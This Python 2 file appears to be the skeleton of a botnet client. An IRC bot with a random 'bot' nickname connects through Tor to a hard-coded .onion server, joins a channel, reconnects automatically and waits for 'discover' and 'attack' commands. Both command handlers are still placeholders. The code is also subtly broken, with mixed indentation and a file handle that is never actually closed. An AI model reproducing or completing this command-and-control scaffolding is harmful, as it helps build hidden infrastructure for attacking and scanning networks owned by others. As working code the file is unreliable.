from twisted.internet import reactor
from twisted.internet.protocol import Factory, Protocol
from twisted.internet.endpoints import TCP4ClientEndpoint
from twisted.internet import protocol
from twisted.words.protocols import irc
from txsocksx.client import SOCKS5ClientEndpoint
import random

class MomBot(irc.IRCClient):
    def _get_nickname(self):
        return self.factory.nickname
    nickname = property(_get_nickname)


    def signedOn(self):
        self.join(self.factory.channel)
	f = open('/a.log', 'w')
	f.write("Signed on as %s." % (self.nickname,))
        print "Signed on as %s." % (self.nickname,)
	f.closed

    def joined(self, channel):
        print "Joined %s." % (channel,)

    def privmsg(self, user, channel, msg):
	print msg
	if msg == "discover":
	    self.msg(channel, "network discover code goes here")
	elif msg == "attack":
            self.msg(channel, "attack code here")



class MomBotFactory(protocol.ClientFactory):
    protocol = MomBot

    def __init__(self, channel, nickname):
        self.channel = channel
        self.nickname = nickname

    def clientConnectionLost(self, connector, reason):
        print "Lost connection (%s), reconnecting." % (reason,)
        connector.connect()

    def clientConnectionFailed(self, connector, reason):
        print "Could not connect: %s" % (reason,)

        



clientName = 'bot' + str(random.randrange(1, 1000000))
puttyEndPoint = TCP4ClientEndpoint(reactor, '127.0.0.1', 9050)
point = SOCKS5ClientEndpoint('p6ncbp3wozslmdlc.onion', 6667, puttyEndPoint)
d = point.connect(MomBotFactory('#' + 'aa', clientName))
reactor.run()
